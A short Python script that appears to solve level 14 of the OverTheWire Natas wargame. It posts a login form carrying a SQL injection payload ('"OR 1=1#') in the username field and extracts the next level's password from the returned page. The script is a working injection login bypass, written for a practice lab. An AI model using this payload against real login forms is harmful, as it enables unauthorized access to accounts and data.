import subprocess
import re
import requests
from requests.auth import HTTPBasicAuth

def get_pass():
    passw = subprocess.run(['getpass', '14'], stdout=subprocess.PIPE).stdout.decode('utf-8')
    #Get request to website, creates object that contains a .text property
    #text property holds the html of the webpage
    payload = {'username':'"OR 1=1#','password':'','submit':'Login'}
    r = requests.post('http://natas14.natas.labs.overthewire.org/', auth=('natas14', passw.strip()), data=payload)
    passreg = '[a-zA-Z0-9]{32}'
    print(re.findall(passreg, r.text)[1])
    #print(r.text)

if __name__ == "__main__":
    get_pass()
